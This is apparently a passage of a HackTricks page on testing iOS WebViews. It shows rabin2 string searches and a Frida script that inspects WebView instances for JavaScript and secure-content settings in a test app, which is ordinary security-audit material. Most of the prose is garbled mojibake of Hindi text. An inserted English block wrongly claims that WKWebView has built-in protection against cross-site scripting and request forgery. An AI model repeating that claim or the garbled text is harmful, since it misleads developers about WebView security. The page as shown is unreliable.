# iOS WebViews

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>тШБя╕П HackTricks Cloud тШБя╕П</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ЁЯРж Twitter ЁЯРж</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ЁЯОЩя╕П Twitch ЁЯОЩя╕П</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ЁЯОе Youtube ЁЯОе</strong></a></summary>

- рдХреНрдпрд╛ рдЖрдк рдХрд┐рд╕реА **рд╕рд╛рдЗрдмрд░ рд╕реБрд░рдХреНрд╖рд╛ рдХрдВрдкрдиреА** рдореЗрдВ рдХрд╛рдо рдХрд░рддреЗ рд╣реИрдВ? рдХреНрдпрд╛ рдЖрдк рдЕрдкрдиреА рдХрдВрдкрдиреА рдХреЛ **рд╣реИрдХрдЯреНрд░рд┐рдХреНрд╕ рдореЗрдВ рд╡рд┐рдЬреНрдЮрд╛рдкрд┐рдд** рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ? рдпрд╛ рдХреНрдпрд╛ рдЖрдкрдХреЛ **PEASS рдХреА рдирд╡реАрдирддрдо рд╕рдВрд╕реНрдХрд░рдг рдпрд╛ HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдиреЗ рдХрд╛ рдЙрдкрдпреЛрдЧ** рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИ? [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдПрдВ**](https://github.com/sponsors/carlospolop) рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ!

- рдЦреЛрдЬреЗрдВ [**The PEASS Family**](https://opensea.io/collection/the-peass-family), рд╣рдорд╛рд░рд╛ рд╡рд┐рд╢реЗрд╖ рд╕рдВрдЧреНрд░рд╣ [**NFTs**](https://opensea.io/collection/the-peass-family)

- рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS рдФрд░ HackTricks swag**](https://peass.creator-spring.com)

- **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** [**ЁЯТм**](https://emojipedia.org/speech-balloon/) [**Discord рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ рдореБрдЭреЗ **рдЯреНрд╡рд┐рдЯрд░** рдкрд░ **рдлрд╝реЙрд▓реЛ** рдХрд░реЗрдВ [**ЁЯРж**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ** [**hacktricks рд░реЗрдкреЛ**](https://github.com/carlospolop/hacktricks) рдФрд░ [**hacktricks-cloud рд░реЗрдкреЛ**](https://github.com/carlospolop/hacktricks-cloud) рдореЗрдВ рдкреАрдЖрд░ рдЬрдорд╛ рдХрд░рдХреЗред

</details>

## WebViews рдкреНрд░рдХрд╛рд░

WebViews рдЗрдВрдЯрд░реИрдХреНрдЯрд┐рд╡ **рд╡реЗрдм** **рд╕рд╛рдордЧреНрд░реА** рдкреНрд░рджрд░реНрд╢рд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЗрди-рдРрдк рдмреНрд░рд╛рдЙрдЬрд╝рд░ рдХрдВрдкреЛрдиреЗрдВрдЯ рд╣реИрдВред рдЗрдиреНрд╣реЗрдВ рдЗрд╕реНрддреЗрдорд╛рд▓ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рддрд╛рдХрд┐ рд╡реЗрдм рд╕рд╛рдордЧреНрд░реА рдХреЛ рд╕реАрдзреЗ рдРрдк рдХреЗ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЗрдВрдЯрд░рдлрд╝реЗрд╕ рдореЗрдВ рдПрдореНрдмреЗрдб рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗред iOS WebViews **рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ JavaScript** рдХреЛ **рд╕рдорд░реНрдерд┐рдд** рдХрд░рддреЗ рд╣реИрдВ, рдЗрд╕рд▓рд┐рдП рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдЗрдВрдЬреЗрдХреНрд╢рди рдФрд░ рдХреНрд░реЙрд╕-рд╕рд╛рдЗрдЯ рд╕реНрдХреНрд░рд┐рдкреНрдЯрд┐рдВрдЧ рд╣рдорд▓реЗ рдЙрди рдкрд░ рдкреНрд░рднрд╛рд╡ рдбрд╛рд▓ рд╕рдХрддреЗ рд╣реИрдВред

* [**UIWebView**](https://developer.apple.com/documentation/uikit/uiwebview)**:** UIWebView iOS 12 рд╕реЗ рдЕрджреНрдпрддрд┐рдд рд╣реЛ рдЧрдпрд╛ рд╣реИ рдФрд░ рдЗрд╕реЗ рдЙрдкрдпреЛрдЧ рдирд╣реАрдВ рдХрд┐рдпрд╛ рдЬрд╛рдирд╛ рдЪрд╛рд╣рд┐рдПред рдЗрд╕реЗ рдЙрдкрдпреЛрдЧ рдирд╣реАрдВ рдХрд░рдирд╛ рдЪрд╛рд╣рд┐рдПред **JavaScript рдХреЛ рдЕрдХреНрд╖рдо рдирд╣реАрдВ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛** рд╣реИред
* [**WKWebView**](https://developer.apple.com/documentation/webkit/wkwebview): рдпрд╣ рдРрдк рдХреА рдХрд╛рд░реНрдпрд╛рддреНрдордХрддрд╛ рдХрд╛ рд╡рд┐рд╕реНрддрд╛рд░ рдХрд░рдиреЗ, рдкреНрд░рджрд░реНрд╢рд┐рдд рд╕рд╛рдордЧреНрд░реА рдХреЛ рдирд┐рдпрдВрддреНрд░рд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреБрдХреНрдд рд╡рд┐рдХрд▓реНрдк рд╣реИред
* **JavaScript** рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ рд╕рдХреНрд╖рдо рд╣реИ, рд▓реЗрдХрд┐рди `WKWebView` рдХреА `javaScriptEnabled` рдЧреБрдгрдзрд░реНрдо рдХреЗ рдХрд╛рд░рдг рдЗрд╕реЗ **рдкреВрд░реА рддрд░рд╣ рд╕реЗ рдЕрдХреНрд╖рдо рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ**, рдЬрд┐рд╕рд╕реЗ рд╕рднреА рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдЗрдВрдЬреЗрдХреНрд╢рди рджреЛрд╖реЛрдВ рдХреЛ рд░реЛрдХрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред
* **`JavaScriptCanOpenWindowsAutomatically`** рдХрд╛ рдЙрдкрдпреЛрдЧ рдирдП рд╡рд┐рдВрдбреЛрдВ рдХреЛ рдЦреЛрд▓рдиреЗ рд╕реЗ рдЬреИрд╕реЗ рдкреЙрдк-рдЕрдкреНрд╕ рд╕реЗ JavaScript рдХреЛ **рд░реЛрдХрдиреЗ** рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред
* **`hasOnlySecureContent`** рдЧреБрдгрдзрд░реНрдо рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рддрд╛рдХрд┐ WebView рджреНрд╡рд╛рд░рд╛ рд▓реЛрдб рдХреА рдЧрдИ рд╕рдВрд╕рд╛рдзрдиреЛрдВ рдХреА рдЬрд╛рдВрдЪ рдХреА рдЬрд╛ рд╕рдХреЗ рдХрд┐ рд╡реЗ рдПрдиреНрдХреНрд░рд┐рдкреНрдЯреЗрдб рдХрдиреЗрдХреНрд╢рди рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдкреНрд░рд╛рдкреНрдд рдХреА рдЬрд╛рддреА рд╣реИрдВред
* `WKWebView` рдЖрдЙрдЯ-рдСрдл-рдкреНрд░реЛрд╕реЗрд╕ рд░реЗрдВрдбрд░рд┐рдВрдЧ рдХреЛ рд▓рд╛рдЧреВ рдХрд░рддрд╛ рд╣реИ, рдЗрд╕рд▓рд┐рдП **рдореЗрдореЛрд░реА рдХрд░реНрдХрд╢рддрд╛ рдмрдЧ** рдореБрдЦреНрдп рдРрдк рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдкрд░ рдкреНрд░рднрд╛рд╡ рдирд╣реАрдВ рдбрд╛рд▓реЗрдЧреАред
*   [**SFSafariViewController**](https://developer.apple.com/documentation/safariservices/sfsafariviewcontroller)**:** рдЗрд╕реЗ рдПрдХ **рд╕рд╛рдорд╛рдиреНрдп рд╡реЗрдм рджреЗрдЦрдиреЗ рдХрд╛ рдЕрдиреБрднрд╡** рдкреНрд░рджрд╛рди рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рдирд╛ рдЪрд╛рд╣рд┐рдПред рдЗрди WebViews рдХреЛ рдЖрд╕рд╛рдиреА рд╕реЗ рдкрд╣рдЪрд╛рдирд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рдХреНрдпреЛрдВрдХрд┐ рдЗрд╕рдореЗрдВ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рддрддреНрд╡ рд╢рд╛рдорд┐рд▓ рд╣реЛрддреЗ рд╣реИрдВ:

* рдПрдХ рдкрдардиреАрдп рдкрддрд╛ рдХреНрд╖реЗрддреНрд░ рдЬрд┐рд╕рдореЗрдВ рд╕реБрд░рдХреНрд╖рд╛ рд╕рдВрдХреЗрддрдХ рд╣реЛрддрд╛ рд╣реИред
* рдПрдХ рдХрд╛рд░реНрд░рд╡рд╛рдИ ("**рд╢реЗрдпрд░**") **рдмрдЯрди**ред
* рдПрдХ **рдХрд┐рдпрд╛ рдЧрдпрд╛ рдмрдЯрди**, рдкреАрдЫреЗ рдФрд░ рдЖрдЧреЗ рдХреА рдиреЗрд╡рд┐рдЧреЗрд╢рди рдмрдЯрди, рдФрд░ рдкреГрд╖реНрда рдХреЛ рд╕реАрдзреЗ рд╕рдлрд╛рд░реА рдореЗрдВ рдЦреЛрд▓рдиреЗ рдХреЗ рд▓рд┐рдП "рд╕рдлрд╛рд░реА" рдмрдЯрдиред

<img src="https://gblobscdn.gitbook.com/assets%2F-LH00RC4WVf3-6Ou4e0l%2F-Lf1APQHyCHdAvoJSvc_%2F-Lf1AQxr7FPsOyPFSGcs%2Fsfsafariviewcontroller.png?alt=media" alt="" data-size="original">

* `SFSafariViewController` рдореЗрдВ **JavaScript рдХреЛ рдЕрдХреНрд╖рдо рдирд╣реАрдВ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛** рд╣реИ рдФрд░ рдпрд╣ рдПрдХ рдХрд╛рд░рдг рд╣реИ рдХрд┐ рдЬрдм рдРрдк рдХреЗ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЗрдВрдЯрд░рдлрд╝реЗрд╕ рдХрд╛ рд╡рд┐рд╕реНрддрд╛рд░ рдХрд░рдирд╛ рд╣реЛ, `WKWebView` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред
* `SFSafariViewController` рднреА **рдХреБрдХреАрдЬрд╝ рд╕рд╛рдЭрд╛** рдХрд░рддрд╛ рд╣реИ рдФрд░ рдЕрдиреНрдп рд╡реЗрдмрд╕рд╛рдЗрдЯ рдбреЗрдЯрд╛ рдХреЛ **рд╕рдлрд╛рд░реА** рдХреЗ рд╕рд╛рдеред
* рдПрдХ `SFSafariViewController` рдХреЗ рд╕рд╛рде рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреА рдЧрддрд┐рд╡рд┐рдзрд┐ рдФрд░ рдЗрдВрдЯрд░реИрдХреНрд╢рди **рдРрдк рдХреЛ рджрд┐рдЦрд╛рдИ рдирд╣реАрдВ рджреЗрддреА рд╣реИ**, рдЬрд┐рд╕рд╕реЗ рдСрдЯреЛрдлрд╝рд┐рд▓ рдбреЗрдЯрд╛, рдмреНрд░рд╛рдЙрдЬрд╝рд┐рдВрдЧ рдЗрддрд┐рд╣рд╛рд╕ рдпрд╛ рд╡реЗрдмрд╕рд╛рдЗрдЯ рдбреЗрдЯрд╛ рддрдХ рдкрд╣реБрдВрдЪ рдирд╣реАрдВ рд╣реЛрддреА рд╣реИред
* рдРрдк рд╕реНрдЯреЛрд░ рд╕рдореАрдХреНрд╖рд╛ рджрд┐рд╢рд╛рдирд┐рд░реНрджреЗрд╢реЛрдВ рдХреЗ рдЕрдиреБрд╕рд╛рд░, `SFSafariViewController`s **рдЕрдиреНрдп рджреГрд╢реНрдпреЛрдВ рдпрд╛ рдкрд░рддреЛрдВ рджреНрд╡рд╛рд░рд╛ рдЫрд┐рдкрд╛ рдирд╣реАрдВ рдЬрд╛ рд╕рдХрддреЗ** рд╣реИрдВред

## Web
```bash
$ rabin2 -zz ./WheresMyBrowser | egrep "UIWebView$"
489 0x0002fee9 0x10002fee9   9  10 (5.__TEXT.__cstring) ascii UIWebView
896 0x0003c813 0x0003c813  24  25 () ascii @_OBJC_CLASS_$_UIWebView
1754 0x00059599 0x00059599  23  24 () ascii _OBJC_CLASS_$_UIWebView
```
**WKWebView** is a powerful tool for displaying web content in iOS applications. It provides a more modern and efficient alternative to the older UIWebView. WKWebView offers improved performance, better security, and enhanced JavaScript support.

Some important features of WKWebView include:

- **Native integration**: WKWebView is built on the WebKit framework, which is the same engine used by Safari. This ensures a consistent and reliable browsing experience for users.

- **Improved performance**: WKWebView utilizes a multi-process architecture, which allows for better resource management and faster loading times. It also supports hardware acceleration, resulting in smoother scrolling and animations.

- **Enhanced JavaScript support**: WKWebView provides a more comprehensive set of JavaScript APIs compared to UIWebView. This enables developers to create more interactive and dynamic web applications.

- **Better security**: WKWebView includes built-in protection against common web vulnerabilities, such as cross-site scripting (XSS) and cross-site request forgery (CSRF). It also enforces stricter content security policies to prevent malicious code execution.

- **Customization options**: WKWebView offers various configuration options, allowing developers to tailor the browsing experience to their specific needs. This includes features like user agent customization, cookie management, and content filtering.

Overall, WKWebView is a versatile and powerful tool for integrating web content into iOS applications. Its improved performance, enhanced security, and extensive JavaScript support make it a preferred choice for developers.
```bash
$ rabin2 -zz ./WheresMyBrowser | egrep "WKWebView$"
490 0x0002fef3 0x10002fef3   9  10 (5.__TEXT.__cstring) ascii WKWebView
625 0x00031670 0x100031670  17  18 (5.__TEXT.__cstring) ascii unwindToWKWebView
904 0x0003c960 0x0003c960  24  25 () ascii @_OBJC_CLASS_$_WKWebView
1757 0x000595e4 0x000595e4  23  24 () ascii _OBJC_CLASS_$_WKWebView
```
рд╡реИрдХрд▓реНрдкрд┐рдХ рд░реВрдк рд╕реЗ, рдЖрдк рдЗрди WebView рдХрдХреНрд╖рд╛рдУрдВ рдХреЗ рдЬреНрдЮрд╛рдд рддрд░реАрдХреЛрдВ рдХреА рднреА рдЦреЛрдЬ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, рдПрдХ WKWebView рдХреЛ рдкреНрд░рд╛рд░рдВрдн рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд┐рдП рдЬрд╛рдиреЗ рд╡рд╛рд▓реЗ рд╡рд┐рдзрд┐ рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ ([`init(frame:configuration:)`](https://developer.apple.com/documentation/webkit/wkwebview/1414998-init)):
```bash
$ rabin2 -zzq ./WheresMyBrowser | egrep "WKWebView.*frame"
0x5c3ac 77 76 __T0So9WKWebViewCABSC6CGRectV5frame_So0aB13ConfigurationC13configurationtcfC
0x5d97a 79 78 __T0So9WKWebViewCABSC6CGRectV5frame_So0aB13ConfigurationC13configurationtcfcTO
0x6b5d5 77 76 __T0So9WKWebViewCABSC6CGRectV5frame_So0aB13ConfigurationC13configurationtcfC
0x6c3fa 79 78 __T0So9WKWebViewCABSC6CGRectV5frame_So0aB13ConfigurationC13configurationtcfcTO
```
#### рдЬрд╛рд╡рд╛рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдХрд╛ рдкрд░реАрдХреНрд╖рдг

`WKWebView` рдХреЗ рд▓рд┐рдП, рдПрдХ рд╕рд░реНрд╡реЛрддреНрддрдо рдкреНрд░рдерд╛ рдХреЗ рд░реВрдк рдореЗрдВ, рдЬрдм рддрдХ рдпрд╣ рд╡рд┐рд╢реЗрд╖ рд░реВрдк рд╕реЗ рдЖрд╡рд╢реНрдпрдХ рди рд╣реЛ, рдЬрд╛рд╡рд╛рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдХреЛ рдЕрдХреНрд╖рдо рдХрд░ рджрд┐рдпрд╛ рдЬрд╛рдирд╛ рдЪрд╛рд╣рд┐рдПред рдпрд╣ рд╕рддреНрдпрд╛рдкрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐ рдЬрд╛рд╡рд╛рд╕реНрдХреНрд░рд┐рдкреНрдЯ рд╕рд╣реА рдврдВрдЧ рд╕реЗ рдЕрдХреНрд╖рдо рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ, `WKPreferences` рдХреЗ рдЙрдкрдпреЛрдЧ рдХреЗ рд▓рд┐рдП рдкрд░рд┐рдпреЛрдЬрдирд╛ рдореЗрдВ рдЦреЛрдЬ рдХрд░реЗрдВ рдФрд░ рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рдХрд░реЗрдВ рдХрд┐ [`javaScriptEnabled`](https://developer.apple.com/documentation/webkit/wkpreferences/1536203-javascriptenabled) рдкреНрд░реЙрдкрд░реНрдЯреА рдХреЛ `false` рдкрд░ рд╕реЗрдЯ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ:
```
let webPreferences = WKPreferences()
webPreferences.javaScriptEnabled = false
```
рдпрджрд┐ рдХреЗрд╡рд▓ рдХрдВрдкрд╛рдЗрд▓ рдХрд┐рдпрд╛ рдЧрдпрд╛ рдмрд╛рдЗрдирд░реА рдЙрдкрд▓рдмреНрдз рд╣реИ, рддреЛ рдЖрдк рдЗрд╕реЗ рдЦреЛрдЬ рд╕рдХрддреЗ рд╣реИрдВ:
```bash
$ rabin2 -zz ./WheresMyBrowser | grep -i "javascriptenabled"
391 0x0002f2c7 0x10002f2c7  17  18 (4.__TEXT.__objc_methname) ascii javaScriptEnabled
392 0x0002f2d9 0x10002f2d9  21  22 (4.__TEXT.__objc_methname) ascii setJavaScriptEnabled
```
#### рдХреЗрд╡рд▓ рд╕реБрд░рдХреНрд╖рд┐рдд рд╕рд╛рдордЧреНрд░реА рдХрд╛ рдкрд░реАрдХреНрд╖рдг

`UIWebView` рдХреЗ рд╡рд┐рдкрд░реАрдд, `WKWebView` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддреЗ рд╕рдордп [рдорд┐рд╢реНрд░рд┐рдд рд╕рд╛рдордЧреНрд░реА](https://developers.google.com/web/fundamentals/security/prevent-mixed-content/fixing-mixed-content?hl=en) (HTTPS рдкреГрд╖реНрда рд╕реЗ рд▓реЛрдб рд╣реЛрдиреЗ рд╡рд╛рд▓реА HTTP рд╕рд╛рдордЧреНрд░реА) рдХрд╛ рдкрддрд╛ рд▓рдЧрд╛рдирд╛ рд╕рдВрднрд╡ рд╣реЛрддрд╛ рд╣реИред [`hasOnlySecureContent`](https://developer.apple.com/documentation/webkit/wkwebview/1415002-hasonlysecurecontent) рд╡рд┐рдзрд┐ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд╕рддреНрдпрд╛рдкрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рдХрд┐ рдкреГрд╖реНрда рдкрд░ рд╕рднреА рд╕рдВрд╕рд╛рдзрди рд╕реБрд░рдХреНрд╖рд┐рдд рд░реВрдк рд╕реЗ рдПрдиреНрдХреНрд░рд┐рдкреНрдЯреЗрдб рдХрдиреЗрдХреНрд╢рди рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рд▓реЛрдб рд╣реБрдП рд╣реИрдВред\
рд╕рдВрдХрд▓рд┐рдд рдмрд╛рдЗрдирд░реА рдореЗрдВ:
```bash
$ rabin2 -zz ./WheresMyBrowser | grep -i "hasonlysecurecontent"
```
рдЖрдк рд╕реНрд░реЛрдд рдХреЛрдб рдпрд╛ рд╕реНрдЯреНрд░рд┐рдВрдЧ рдореЗрдВ "http://" рд╕реНрдЯреНрд░рд┐рдВрдЧ рдХреА рдЦреЛрдЬ рднреА рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рд╣рд╛рд▓рд╛рдВрдХрд┐, рдпрд╣ рдЖрд╡рд╢реНрдпрдХ рдирд╣реАрдВ рд╣реИ рдХрд┐ рдпрд╣ рдорд┐рд╢реНрд░рд┐рдд рд╕рд╛рдордЧреНрд░реА рд╕рдорд╕реНрдпрд╛ рд╣реЛред рдорд┐рд╢реНрд░рд┐рдд рд╕рд╛рдордЧреНрд░реА рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд▓рд┐рдП [MDN Web Docs](https://developer.mozilla.org/en-US/docs/Web/Security/Mixed\_content) рдкрд░ рдЬрд╛рдПрдВред

### рдЧрддрд┐рд╢реАрд▓ рд╡рд┐рд╢реНрд▓реЗрд╖рдг

`ObjC.choose()` рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рд╣реАрдк рдХреА рдЬрд╛рдВрдЪ рдХреА рдЬрд╛ рд╕рдХрддреА рд╣реИ рддрд╛рдХрд┐ рд╡рд┐рднрд┐рдиреНрди рдкреНрд░рдХрд╛рд░ рдХреЗ WebViews рдХреЗ рдЙрджрд╛рд╣рд░рдгреЛрдВ рдХреЛ рдвреВрдВрдврд╝рд╛ рдЬрд╛ рд╕рдХреЗ рдФрд░ рд╕рдВрдкрддреНрддрд┐рдпреЛрдВ `javaScriptEnabled` рдФрд░ `hasonlysecurecontent` рдХреА рдЦреЛрдЬ рднреА рдХреА рдЬрд╛ рд╕рдХрддреА рд╣реИ: 

{% code title="webviews_inspector.js" %}
```javascript
ObjC.choose(ObjC.classes['UIWebView'], {
onMatch: function (ui) {
console.log('onMatch: ', ui);
console.log('URL: ', ui.request().toString());
},
onComplete: function () {
console.log('done for UIWebView!');
}
});

ObjC.choose(ObjC.classes['WKWebView'], {
onMatch: function (wk) {
console.log('onMatch: ', wk);
console.log('URL: ', wk.URL().toString());
},
onComplete: function () {
console.log('done for WKWebView!');
}
});

ObjC.choose(ObjC.classes['SFSafariViewController'], {
onMatch: function (sf) {
console.log('onMatch: ', sf);
},
onComplete: function () {
console.log('done for SFSafariViewController!');
}
});

ObjC.choose(ObjC.classes['WKWebView'], {
onMatch: function (wk) {
console.log('onMatch: ', wk);
console.log('javaScriptEnabled:', wk.configuration().preferences().javaScriptEnabled());
}
});

ObjC.choose(ObjC.classes['WKWebView'], {
onMatch: function (wk) {
console.log('onMatch: ', wk);
console.log('hasOnlySecureContent: ', wk.hasOnlySecureContent().toString());
}
});
```
{% endcode %}

рдЗрд╕реЗ рд▓реЛрдб рдХрд░реЗрдВ:
```bash
frida -U com.authenticationfailure.WheresMyBrowser -l webviews_inspector.js

onMatch:  <WKWebView: 0x1508b1200; frame = (0 0; 320 393); layer = <CALayer: 0x1c4238f20>>

hasOnlySecureContent:  false
```
## WebView рдкреНрд░реЛрдЯреЛрдХреЙрд▓ рд╣реИрдВрдбрд▓рд┐рдВрдЧ

рдЖрдИрдУрдПрд╕ рдкрд░ WebView рдореЗрдВ рдХрдИ рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд╕реНрдХреАрдореНрд╕ рдЙрдкрд▓рдмреНрдз рд╣реИрдВ, рдЬреИрд╕реЗ:

* http(s)://
* file://
* tel://

WebView рдПрдХ рдПрдВрдбрдкреЙрдЗрдВрдЯ рд╕реЗ рд░рд┐рдореЛрдЯ рд╕рд╛рдордЧреНрд░реА рд▓реЛрдб рдХрд░ рд╕рдХрддрд╛ рд╣реИ, рд▓реЗрдХрд┐рди рдпрд╣ рдРрдк рдбреЗрдЯрд╛ рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рд╕реЗ рд╕реНрдерд╛рдиреАрдп рд╕рд╛рдордЧреНрд░реА рднреА рд▓реЛрдб рдХрд░ рд╕рдХрддрд╛ рд╣реИред рдпрджрд┐ рд╕реНрдерд╛рдиреАрдп рд╕рд╛рдордЧреНрд░реА рд▓реЛрдб рдХреА рдЬрд╛рддреА рд╣реИ, рддреЛ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ рдлрд╝рд╛рдЗрд▓ рдХреЛ рд▓реЛрдб рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд┐рдП рдЧрдП рдлрд╝рд╛рдЗрд▓рдирд╛рдо рдпрд╛ рдкрде рдкрд░ рдкреНрд░рднрд╛рд╡ рдирд╣реАрдВ рдбрд╛рд▓рдирд╛ рдЪрд╛рд╣рд┐рдП, рдФрд░ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рд▓реЛрдб рдХреА рдЧрдИ рдлрд╝рд╛рдЗрд▓ рдХреЛ рд╕рдВрдкрд╛рджрд┐рдд рдирд╣реАрдВ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

### WebView рд╕рд╛рдордЧреНрд░реА рд▓реЛрдб

* **UIWebView**: рдЗрд╕рдореЗрдВ рд╡рд┐рдЪрд▓рд┐рдд рд╡рд┐рдзрд┐рдпреЛрдВ [`loadHTMLString:baseURL:`](https://developer.apple.com/documentation/uikit/uiwebview/1617979-loadhtmlstring?language=objc) рдпрд╛ [`loadData:MIMEType:textEncodingName:baseURL:`](https://developer.apple.com/documentation/uikit/uiwebview/1617941-loaddata?language=objc) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рд╛рдордЧреНрд░реА рд▓реЛрдб рдХреА рдЬрд╛ рд╕рдХрддреА рд╣реИред
* **WKWebView**: рдЗрд╕рдореЗрдВ рд╡рд┐рдзрд┐рдпреЛрдВ [`loadHTMLString:baseURL:`](https://developer.apple.com/documentation/webkit/wkwebview/1415004-loadhtmlstring?language=objc) рдпрд╛ [`loadData:MIMEType:textEncodingName:baseURL:`](https://developer.apple.com/documentation/webkit/wkwebview/1415011-loaddata?language=objc) рдХрд╛ рдЙрдкрдпреЛрдЧ рд╕реНрдерд╛рдиреАрдп HTML рдлрд╝рд╛рдЗрд▓реЛрдВ рдХреЛ рд▓реЛрдб рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдФрд░ рд╡реЗрдм рд╕рд╛рдордЧреНрд░реА рдХреЗ рд▓рд┐рдП `loadRequest:` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред рд╕рд╛рдорд╛рдиреНрдпрддрдГ, рд╕реНрдерд╛рдиреАрдп рдлрд╝рд╛рдЗрд▓реЛрдВ рдХреЛ рд▓реЛрдб рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЗрдирдореЗрдВ рд╕реЗ рдХреБрдЫ рд╡рд┐рдзрд┐рдпрд╛рдБ рд╢рд╛рдорд┐рд▓ рд╣реЛрддреА рд╣реИрдВ: [`pathForResource:ofType:`](https://developer.apple.com/documentation/foundation/nsbundle/1410989-pathforresource), [`URLForResource:withExtension:`](https://developer.apple.com/documentation/foundation/nsbundle/1411540-urlforresource?language=objc) рдпрд╛ [`init(contentsOf:encoding:)`](https://developer.apple.com/documentation/swift/string/3126736-init)ред рдЗрд╕рдХреЗ рдЕрд▓рд╛рд╡рд╛, рдЖрдкрдХреЛ рдпрд╣ рднреА рд╕рддреНрдпрд╛рдкрд┐рдд рдХрд░рдирд╛ рдЪрд╛рд╣рд┐рдП рдХрд┐ рдРрдк рд╡рд┐рдзрд┐ [`loadFileURL:allowingReadAccessToURL:`](https://developer.apple.com/documentation/webkit/wkwebview/1414973-loadfileurl?language=objc) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд░рд╣рд╛ рд╣реИ рдпрд╛ рдирд╣реАрдВред рдЗрд╕рдХрд╛ рдкрд╣рд▓рд╛ рдкреИрд░рд╛рдореАрдЯрд░ `URL` рд╣реИ рдФрд░ рдЗрд╕рдореЗрдВ WebView рдореЗрдВ рд▓реЛрдб рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП URL рд╣реЛрддрд╛ рд╣реИ, рдЗрд╕рдХрд╛ рджреВрд╕рд░рд╛ рдкреИрд░рд╛рдореАрдЯрд░ `allowingReadAccessToURL` рдПрдХрд▓ рдлрд╝рд╛рдЗрд▓ рдпрд╛ рдПрдХ 